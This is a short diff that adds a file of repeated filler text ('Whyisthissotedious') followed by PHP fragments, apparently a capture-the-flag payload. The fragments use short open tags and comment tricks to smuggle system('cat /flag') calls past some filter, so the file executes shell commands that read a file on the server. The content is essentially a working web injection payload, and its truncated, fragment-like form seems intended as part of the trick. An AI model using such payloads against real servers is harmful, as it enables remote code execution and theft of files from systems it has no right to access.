@@ -1,0 +1,11 @@
+Whyisthissotedious Whyisthissotedious Whyisthissotedious Whyisthissotedious
+Whyisthissotedious Whyisthissotedious Whyisthissotedious Whyisthissotedious
+Whyisthissotedious Whyisthissotedious Whyisthissotedious Whyisthissotedious
+Whyisthissotedious Whyisthissotedious Whyisthissotedious Whyisthissotedious
+<? echo "ohhi."/**
+*/; 
+system('cat /flag'
+Whyisthissotedio
+<? system('cat "
+"| cat /flag')/*
+*/?>
